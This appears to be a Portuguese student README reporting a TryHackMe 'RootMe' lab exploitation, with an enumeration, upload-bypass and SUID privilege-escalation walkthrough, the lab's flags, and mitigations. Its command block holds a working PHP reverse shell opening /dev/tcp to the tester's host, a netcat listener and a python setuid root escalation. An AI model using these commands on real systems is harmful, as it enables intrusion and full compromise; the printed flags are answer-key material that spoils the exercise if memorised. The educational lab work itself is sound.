# 🔓 Pentest RootMe - TryHackMe

Relatório técnico de exploração da máquina **RootMe** na plataforma TryHackMe, desenvolvido para a disciplina de Segurança da Informação.

## 📋 Sobre o Projeto

Este repositório documenta a exploração completa de uma máquina vulnerável em ambiente controlado, seguindo a metodologia padrão de testes de penetração:

1. **Reconhecimento** — Identificação de serviços ativos
2. **Enumeração** — Descoberta de recursos e diretórios
3. **Exploração** — Upload de reverse shell com bypass de filtro
4. **Pós-Exploração** — Escalação de privilégios via SUID

## 🎯 Informações do Alvo

| Item | Descrição |
|------|-----------|
| Plataforma | TryHackMe |
| Máquina | RootMe |
| Sistema Operacional | Ubuntu Linux |
| Dificuldade | Fácil |

## 🛠️ Ferramentas Utilizadas

- **Nmap** — Escaneamento de portas e serviços
- **Gobuster** — Enumeração de diretórios web
- **Netcat** — Listener para reverse shell
- **PHP Reverse Shell** — Payload de acesso remoto

## 🚀 Reprodução Rápida

```bash
# 1. Escanear portas
nmap -sV -sC <IP_ALVO>

# 2. Enumerar diretórios
gobuster dir -u http://<IP_ALVO> -w /usr/share/wordlists/dirb/common.txt

# 3. Criar reverse shell (shell.phtml)
echo '<?php exec("/bin/bash -c '\''bash -i >& /dev/tcp/<SEU_IP>/4444 0>&1'\''"); ?>' > shell.phtml

# 4. Fazer upload via /panel (navegador)

# 5. Iniciar listener
nc -lvnp 4444

# 6. Executar shell acessando no navegador:
# http://<IP_ALVO>/uploads/shell.phtml

# 7. Capturar flag do usuário
cat /var/www/user.txt

# 8. Encontrar binários SUID
find / -perm -4000 -type f 2>/dev/null

# 9. Escalar privilégios com Python SUID
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# 10. Capturar flag root
cat /root/root.txt
```

## 🔑 Flags Obtidas

| Flag | Valor |
|------|-------|
| user.txt | `THM{y0u_g0t_a_sh3ll}` |
| root.txt | `THM{pr1v1l3g3_3sc4l4t10n}` |

## ⚠️ Vulnerabilidades Encontradas

### 1. Upload Irrestrito de Arquivos (Crítica)
- **Descrição:** O painel de upload permite arquivos PHP com extensão alternativa (.phtml)
- **Impacto:** Execução remota de código (RCE)
- **CVSS:** 9.8
- **Mitigação:** Validar arquivos pelo conteúdo (magic bytes), usar whitelist de extensões, armazenar uploads fora do webroot

### 2. Python com SUID (Crítica)
- **Descrição:** O binário `/usr/bin/python2.7` possui bit SUID ativado
- **Impacto:** Escalação de privilégios para root
- **CVSS:** 7.8
- **Mitigação:** Remover SUID (`chmod u-s /usr/bin/python2.7`), auditar binários SUID regularmente

´´´

**Autor:** Rafael  
**Disciplina:** Segurança da Informação  
**Instituição:** Universidade Comunitária da Região de Chapecó (Unochapecó)  
**Data:** Dezembro de 2025
